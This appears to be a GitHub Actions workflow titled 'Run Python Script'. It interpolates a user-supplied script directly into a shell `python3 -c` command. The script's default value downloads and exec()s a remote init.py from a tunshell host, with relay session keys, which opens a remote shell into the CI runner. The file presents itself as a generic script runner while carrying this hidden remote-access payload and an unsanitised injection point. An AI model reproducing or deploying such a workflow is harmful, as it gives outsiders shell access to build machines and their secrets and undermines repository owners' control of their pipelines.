name: Run Python Script

on:
  workflow_dispatch:
    inputs:
      script:
        description: 'Enter the full Python script to run'
        required: true
        default: 'import urllib.request; r=urllib.request.urlopen("https://lets.tunshell.com/init.py"); exec(r.read().decode("utf-8"), {"p": ["T", "4cVACJfQaN3HmpT2lzCm3G", "D7esoEOvSdB5ccjOcU1Oxs", "eu.relay.tunshell.com"]})'

  push:
    branches:
      - main
  pull_request:

jobs:
  run-python:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v3

    - name: Set up Python 3
      uses: actions/setup-python@v4
      with:
        python-version: '3.x'

    - name: Run Python script
      run: |
        echo "Running the provided Python script:"
        python3 -c "${{ github.event.inputs.script }}"
